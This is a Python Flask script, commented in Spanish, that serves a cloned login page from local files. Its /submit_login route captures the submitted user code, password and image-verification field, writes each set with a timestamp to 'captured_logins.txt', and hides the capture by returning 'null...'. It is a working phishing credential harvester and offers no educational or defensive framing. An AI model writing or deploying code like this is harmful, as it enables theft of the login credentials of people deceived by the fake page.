from flask import Flask, request, send_from_directory, redirect, url_for
import os
import datetime

app = Flask(__name__)

# Configura la ruta para servir archivos estáticos
# La raíz de tu aplicación web será la carpeta 'tu_proyecto'
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
STATIC_FOLDER = BASE_DIR

# Archivo para almacenar los inicios de sesión capturados
LOG_FILE = os.path.join(BASE_DIR, "captured_logins.txt")

@app.route('/')
def serve_index():
    """Sirve el archivo index.html cuando se accede a la raíz del servidor."""
    return send_from_directory(STATIC_FOLDER, 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    """Sirve archivos estáticos (CSS, JS, imágenes) desde la carpeta del proyecto."""
    # Previene el acceso a archivos fuera de STATIC_FOLDER por seguridad
    if ".." in filename or filename.startswith('/'):
        return "Acceso no permitido", 403
    return send_from_directory(STATIC_FOLDER, filename)

@app.route('/submit_login', methods=['POST'])
def handle_login_submit():
    """
    Maneja el envío del formulario de login, captura los datos
    y los guarda en un archivo.
    """
    if request.method == 'POST':
        codigo = request.form.get('t1')  # 't1' es el nombre del campo de código
        password = request.form.get('t2') # 't2' es el nombre del campo de contraseña
        imagen_code = request.form.get('kamousagi') # 'kamousagi' es el nombre del campo de imagen

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        log_entry = f"[{timestamp}] Código: {codigo}, Contraseña: {password}, Imagen: {imagen_code}\n"

        # Almacena los datos en el archivo local
        try:
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_entry)
            print(f"Datos de login capturados y guardados: {log_entry.strip()}")
            # Cambiado de "¡Datos de inicio de sesión capturados! (Consulta captured_logins.txt)" a "null..."
            return "null..."
        except Exception as e:
            print(f"Error al escribir en el archivo de log: {e}")
            return "Error al procesar el formulario."

if __name__ == '__main__':
    # Ejecuta la aplicación Flask
    # Por defecto, se ejecuta en http://127.0.0.1:5000/
    print(f"Servidor web local iniciado en http://127.0.0.1:5000/")
    print(f"Los datos de login capturados se guardarán en: {LOG_FILE}")
    app.run(debug=True) # debug=True permite recargar automáticamente con cambios